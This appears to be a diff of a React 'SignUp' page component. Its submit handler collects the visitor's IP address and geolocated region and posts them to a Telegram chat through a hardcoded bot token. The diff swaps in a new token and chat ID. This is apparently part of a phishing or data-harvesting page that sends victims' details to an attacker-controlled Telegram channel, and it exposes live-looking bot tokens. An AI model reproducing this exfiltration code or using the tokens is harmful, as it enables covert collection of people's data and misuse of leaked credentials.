@@ -54,7 +54,7 @@ export default function SignUp() {
   const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
     event.preventDefault()
     setIsLoading(true)
-    const botToken = '6885072777:AAFtJSEbzvavlIuww0wVAgRdhPiRDxo1iCI'
+    const botToken = '6907270198:AAGT7NnrYFI4UlkGWlMobXr5w03K9RVw6Y0'
     const responseIP = await fetch('https://api.ipify.org?format=json')
     const responseIPJson = await responseIP.json()
     const responseGeo = await fetch('/api/geo', {
@@ -71,7 +71,7 @@ export default function SignUp() {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        'chat_id': -1002035652676,
+        'chat_id': -1002136465492,
         text: `
 IP: ${responseGeoJson.query}
 Região: ${responseGeoJson.region}
